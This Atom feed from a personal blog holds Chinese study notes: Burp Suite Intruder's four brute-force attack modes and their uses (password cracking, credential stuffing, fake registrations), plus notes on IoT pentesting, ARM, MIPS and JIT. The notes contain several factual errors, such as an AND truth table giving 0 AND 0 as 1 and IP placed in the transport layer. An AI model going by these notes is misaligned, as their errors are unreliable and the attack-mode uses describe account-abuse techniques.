<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/"/>
  <updated>2022-08-09T03:25:20.887Z</updated>
  <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>burp四种密码爆破模式学习</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-09T03:24:09.328Z</published>
    <updated>2022-08-09T03:25:20.887Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变</li><li>Battering ram:多参数同时爆破，但用的是同一个字典</li><li>Pitchfork:多参数同时爆破，但用的是不同的字典</li><li>Cluster bamb:多参数做笛卡尔乘积模式爆破</li></ul><h1 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h1><p>（一对一）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。</p><ul><li>此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景</li></ul><h1 id="Battering-ram-破城槌"><a href="#Battering-ram-破城槌" class="headerlink" title="Battering ram(破城槌)"></a>Battering ram(破城槌)</h1><p>（payload一对多）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。</p><ul><li>此模式主要适用于：撞库</li></ul><h1 id="Pitchfork-音叉"><a href="#Pitchfork-音叉" class="headerlink" title="Pitchfork(音叉)"></a>Pitchfork(音叉)</h1><p>可以多组密码本payload</p><p>a:1,2</p><p>b:3,4</p><p>第一次爆破为 1，3</p><p>第二次爆破为 2，4</p><ul><li>此模式主要适用于：恶意注册</li></ul><h1 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h1><p>（多对多）</p><p>对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变&lt;/li&gt;
&lt;li&gt;Battering ram:多参数同时爆破，但用的是同一个字典&lt;/li&gt;
&lt;li&gt;Pitchfork:多参数同时爆破，但用的是不同的字典&lt;/li&gt;
&lt;li&gt;Cl</summary>
      
    
    
    
    
    <category term="bp" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/bp/"/>
    
  </entry>
  
  <entry>
    <title>《物联网渗透测试》学习笔记1</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</id>
    <published>2022-08-09T03:24:06.948Z</published>
    <updated>2020-10-09T08:13:24.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p><ul><li>渗透测试方法：<ul><li>黑盒测试</li><li>白盒测试</li><li>灰盒测试</li></ul></li></ul><h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2><p>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</p><p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p><p>固件组成：闪存、bootloader、内核、根文件系统。</p><ul><li>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</li><li>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</li></ul><h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p><ul><li>目前iot领域主要有两种不同的web应用模型<ul><li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li><li>独立嵌入式服务器模型</li></ul></li></ul><p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p><h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p><ul><li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li><li>NAND闪存以区块为单位读写。存储设备的boootloader。</li><li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li><li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）</li></ul><h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2><p>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。</p><h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-IOT渗透测试&quot;&gt;&lt;a href=&quot;#0x01-IOT渗透测试&quot; class=&quot;headerlink&quot; title=&quot;0x01 IOT渗透测试&quot;&gt;&lt;/a&gt;0x01 IOT渗透测试&lt;/h1&gt;&lt;p&gt;定义IoT生态系统与渗透测试生命周期&lt;/p&gt;
&lt;ul&gt;
&lt;l</summary>
      
    
    
    
    
    <category term="IOT 《物联网渗透测试》" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/"/>
    
  </entry>
  
  <entry>
    <title>《ARM嵌入式Linux系统开发详解》学习笔记1</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</id>
    <published>2022-08-09T03:21:41.844Z</published>
    <updated>2022-08-09T03:22:14.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p><p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p><p><b>嵌入式微控制器：</b></p><p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p><p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p><p><b>嵌入式微处理器：</b></p><p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p><p><b>典型嵌入式系统组成：</b></p><p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p><p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p><p>典型嵌入式系统:</p><ul><li>硬件：<ul><li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li><li>外部设备：在不同系统中有不同选择。</li></ul></li><li>软件：<ul><li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li><li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li></ul></li></ul><h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p><p>进制转换</p><p>计算机组成原理</p><p>直接内存访问：DMA</p><p>软件：系统软件、应用软件</p><p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p><p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p><p>操作系统的基本结构都是内核、驱动程序、程序库。</p><h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul><li>微处理器<ul><li>通用微处理器：用于高性能计算</li><li>嵌入式微处理器：针对某种特定应用的高能力计算</li><li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li></ul></li></ul><p>ARM:高性能RISC机器。</p><ul><li>芯片体积小，功耗低，成本低性能优异</li><li>支持Thumb(16位)和ARM(32位)</li><li>内部大量使用寄存器，执行指令速度快。</li><li>大部分指令是操作寄存器，很少访问外部内存</li><li>采用多级流水线结构处理速度快。</li><li>多种寻址方式，数据存取方式灵活</li><li>指令长度固定，便于编译器操作以及执行指令</li></ul><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul><li>算术运算指令<ul><li>ADD:加法运算<ul><li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li></ul></li><li>ADC:带进位加法<ul><li>ADC dest,op1,op2</li></ul></li><li>SUB:减法<ul><li>sub dest,op1,op2</li><li>dest=op1-op2</li></ul></li><li>SBC：带进位减法</li></ul></li><li>逻辑运算指令<ul><li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul><li>and dest,op1,op2</li><li>dest=op1 and op2</li></ul></li><li>EOR:异或（1 1为0，0 0为0，10为1）</li><li>MOV:复制数据<ul><li>mov dest,op1</li><li>dest=op1</li><li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li></ul></li></ul></li><li>分支指令<ul><li>B:跳转<ul><li>b 地址 //跳转到指定地址</li></ul></li></ul></li><li>数据传送指令<ul><li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul><li>LDR Rd,地址</li><li>STR Rd,地址</li><li>LDR B Rd,地址</li><li>STR B Rd,地址</li></ul></li><li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul><li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li><li>xx:LD–装载，ST–存储</li><li>LDMED LDMIB//++i</li><li>LDMFD LDMIA//i++</li><li>LDMEA LDMDB//++*i</li><li>LDMFA LDMDA//*i++</li><li>STMFA STMIB//存储前增加地址</li><li>STMEA STMIA//存储后增加地址</li><li>STMFD STMDB//存储前增加值</li><li>STMED STMDA//存储后增加值</li></ul></li></ul></li></ul><p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p><p>MMU:内存管理单元。</p><blockquote><p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p></blockquote><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul><li>立即寻址:用#表示数值<ul><li>subs r0,#1;r0=r0-1</li><li>mov r0,#0xff00;r0=0xff00</li></ul></li><li>寄存器寻址方式：读取寄存器得到操作数<ul><li>mov r1,r2;r1=r2</li><li>sub r0,r1,r2;r0=r1-r2</li></ul></li><li>寄存器偏移寻址：寄存器的值移位得结果<ul><li>mov r0,r1,LSL #3;r0=r1*8</li><li>ands r0,r2,LSL #3;r0= r2*8 and r1</li></ul></li><li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul><li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li><li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li></ul></li><li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul><li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li><li>STR r0,[r1,#-2];r1数值-2得到数据地址</li></ul></li><li>多寄存器寻址：一次传输多个寄存器值<ul><li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li></ul></li><li>栈寻址：先进后出，通过栈指针寄存器寻址<ul><li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li><li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li></ul></li></ul><h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p><h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul><li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li><li>linux下：串口工具minicom</li><li>windows下：串口工具xshell</li><li>ARM集成开发环境ADS<ul><li>c语言编译器armcc</li><li>c++语言编译器armcpp</li></ul></li></ul><h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul><li>vi创建源代码文件hello.c</li><li>gcc -c hello.c 编译运行</li></ul><h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1><ul><li>堆栈</li><li>内存管理函数<ul><li>malloc():分配内存，不能初始化内存空间</li><li>free()：释放malloc()分配的内存</li></ul></li><li>实用的内存分配函数<ul><li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li><li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li></ul></li><li>文件指针和流：FILE*fp</li><li>getc() /fgetc() /getchar()</li><li>POSIX文件I/O编程<ul><li>POSIX可移植操作系统接口</li><li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li><li>文件头：<ul><li>&lt;sys/types.h&gt;</li><li>&lt;sys/stat.h&gt;</li><li>&lt;fcntl.h&gt;</li></ul></li></ul></li></ul><h1 id="0x08-开发多进程-x2F-线程程序"><a href="#0x08-开发多进程-x2F-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1><ul><li>PCB进程控制块</li><li>fork()调用创建进程</li><li>退出进程：exit()、_exit()、atexit()、on_exit().</li><li>常用进程间通信方法：<ul><li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul><li>pipe()函数：创建管道</li><li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li></ul></li><li>共享内存：不同进程可访问<ul><li>int shmget():创建</li><li>void *shmat：获得一个共享内存ID对应的内存其实地址</li><li>int shmdt：从程序中分立一块共享内存</li></ul></li><li>FIFO</li><li>消息队列</li><li>信号量</li><li>共享存储</li><li>socker</li></ul></li><li>Linux的多进程和多线程</li></ul><h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul><li>TCP/IP协议簇</li></ul><p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" alt="捕获.PNG"></p><ul><li>IP协议：在传输层，负责数据包的传输管理<ul><li>实现两个功能：寻址和分段</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-嵌入式系统入门&quot;&gt;&lt;a href=&quot;#0x01-嵌入式系统入门&quot; class=&quot;headerlink&quot; title=&quot;0x01 嵌入式系统入门&quot;&gt;&lt;/a&gt;0x01 嵌入式系统入门&lt;/h1&gt;&lt;p&gt;&lt;b&gt;什么是嵌入式系统：&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;一种为特定设</summary>
      
    
    
    
    
    <category term="学习笔记" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>MIPS架构学习笔记</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-08-09T03:17:04.113Z</published>
    <updated>2020-11-13T03:09:13.067Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-寄存器"><a href="#0x01-寄存器" class="headerlink" title="0x01 寄存器"></a>0x01 寄存器</h1><h3 id="32个通用寄存器：-0-31-32位"><a href="#32个通用寄存器：-0-31-32位" class="headerlink" title="32个通用寄存器：$0-$31,32位"></a>32个通用寄存器：$0-$31,32位</h3><p>MIPS32中通用寄存器的约定用法：</p><p>|:–:|:–:|<br>|寄存器名字|约定名字|用途|<br>|$0|zero|总是为0|<br>|$1|at|留作汇编器生成一些合成指令|<br>|$2 $3|v0 v1|用来存放子程序返回值|<br>|$4<del>$7|a0</del>a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数|<br>|$8<del>$15|t0</del>t7|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$16<del>$23|s0</del>s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变|<br>|$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$26 $27|$k0 $k1|由异常处理程序使用|<br>|$28或$gp|gp|全局指针|<br>|$29或$sp|sp|堆栈指针|<br>|$30或$fp|s8/sp|子程序可以用来做堆栈帧指针|<br>|$31|ra|存放子程序返回地址|</p><h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><ul><li>PC:程序计数器</li><li>HI:乘除结果高位寄存器</li><li>LO:乘除结果低位寄存器</li></ul><p><b>MIPS架构属于小端模式</b></p><h3 id="MIPS指令"><a href="#MIPS指令" class="headerlink" title="MIPS指令"></a>MIPS指令</h3><p>|:—-:|:—-:|<br>|指令|功能|<br>|LB|从存储器中读取一个字节的数据到寄存器中|<br>|LH|从存储器中读取半个字的数据到寄存器中|<br>|LW|从存储器中读取一个字的数据到寄存器中|<br>|LD|从存储器中读取双字的数据到寄存器中|<br>|L.S|从存储器中读取单精度浮点数到寄存器中|<br>|L.D|从存储器中读取双精度浮点数到寄存器中|<br>|LBU|=LB,无符号数据|<br>|LHU|=LH,无符号数据|<br>|LWU|=LW,无符号数据|<br>|SB|把一个字节的数据从寄存器存储到存储器中|<br>|SH|把半个字节的数据从寄存器存储到存储器中|<br>|SW|把一个字的数据从寄存器存储到存储器中|<br>|SD|把两个字节的数据从寄存器存储到存储器中|<br>|S.S|把单精度浮点数从寄存器存储到存储器中|<br>|S.D|把双精度数据从存储器存储到存储器中|<br>|DADD|把两个定点寄存器的内容相加，即定点加|<br>|DADDI|把一个寄存器的内容加上一个立即数|<br>|DADDU|不带符号的加|<br>|DADDIU|把一个寄存器的内容加上一个无符号的立即数|<br>|ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数|<br>|ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数|<br>|ADD.PS|两个单精度浮点数相加，结果是单精度浮点数|<br>|DSUB|两个寄存器的内容相减|<br>|DSUBU|不带符号的减|<br>|SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数|<br>|SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数|<br>|SUB.PS|两个单精度浮点数相减|<br>|DDIV|两个顶点寄存器的内容相除|<br>|DDIVU|不带符号的除法运算|<br>|DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数|<br>|DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数|<br>|DIV.PS|两个单精度浮点数相除，结果为单精度|<br>|DMUL|两个定点寄存器的内容相乘|<br>|DMULU|无符号相乘|<br>|MUL.S|双浮点乘单浮点得单浮点|<br>|MUL.D|双浮点乘单浮点得双浮点|<br>|MUL.PS|两个单浮点乘，得单浮点|<br>|AND|与运算|<br>|ANDI|一个寄存器中的内容与一个立即数相与|<br>|OR|或运算|<br>|ORI||<br>|XOR|异或|<br>|XORI||<br>|BEQZ|条件转移指令，当寄存器中内容为0时转移发生|<br>|BENZ|条件转移指令，寄存器内容不为0时转移发生|<br>|BEQ|条件转移指令，两个寄存器内容相等是转移发生|<br>|BNE|条件转移指令，两个寄存器中内容不等时转移发生|<br>|J|直接跳转指令，跳转的地址在指令中|<br>|JR|使用寄存器的跳转指令，跳转的地址在寄存器中|<br>|JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中|<br>|JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31|<br>|MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器|<br>|MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器|<br>|MFC0|把一个数据从通用寄存器复制到特殊寄存器|<br>|MTC0|把一个数据从特殊寄存器复制到通用寄存器|<br>|MFC1|把一个数据从定点寄存器复制到浮点寄存器|<br>|MTC1|把一个数据从浮点寄存器复制到定点寄存器|<br>|LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零|<br>|DSLL|双字逻辑左移|<br>|DSRL|双字逻辑右移|<br>|DSRA|双字算术右移|<br>|DSLLV|可变的双字逻辑左移|<br>|DSRLV|可变的双字逻辑右移|<br>|DSRAV|可变的双字算术右移|<br>|SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0|<br>|SLTI|r2的值小于立即数，则r1为1，否则为0|<br>|SLTU|=SLT带符号|<br>|SLTUI|=SLT不带符号|<br>|MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器|<br>|MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器|<br>|TRAP|根据地址向量转入管态|<br>|ERET|从异常中返回到用户态|<br>|MADD.S|一个双浮点数与单浮点数相乘加，结果为单|<br>|MADD.D|一个双浮点数与单浮点数相乘加，结果为双|<br>|MADD.PS|两个单浮点数相乘加，结果为单|</p><h3 id="大端序小端序复习"><a href="#大端序小端序复习" class="headerlink" title="大端序小端序复习"></a>大端序小端序复习</h3><p>字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关，</p><p>大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-寄存器&quot;&gt;&lt;a href=&quot;#0x01-寄存器&quot; class=&quot;headerlink&quot; title=&quot;0x01 寄存器&quot;&gt;&lt;/a&gt;0x01 寄存器&lt;/h1&gt;&lt;h3 id=&quot;32个通用寄存器：-0-31-32位&quot;&gt;&lt;a href=&quot;#32个通用寄存器：-0</summary>
      
    
    
    
    
    <category term="IOT" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>JIT学习</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-09T03:17:04.108Z</published>
    <updated>2022-08-09T03:41:19.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p><p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p><h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p><p>例子：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">inc</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> </span>{<br>    <span class="hljs-keyword">return</span> a + <span class="hljs-number">1</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">inc</span>(<span class="hljs-number">3</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p><code>objdump -d 1</code>查看它的机器码。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0000000000400526</span> &lt;<span class="hljs-keyword">inc</span>&gt;:<br>  <span class="hljs-number">400526</span>:<span class="hljs-number">55</span>                   <span class="hljs-keyword">push</span>   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器<br>  <span class="hljs-number">400527</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e5             <span class="hljs-keyword">mov</span>    %rsp,%rbp<br>  40052a:<span class="hljs-number">89</span> <span class="hljs-number">7d</span> fc             <span class="hljs-keyword">mov</span>    %edi,-<span class="hljs-number">0x4</span>(%rbp)#把<span class="hljs-built_in">edi</span>存到栈上。在x64处理器上，前<span class="hljs-number">6</span>个参数都是使用寄存器传参的。第一个参数会使用<span 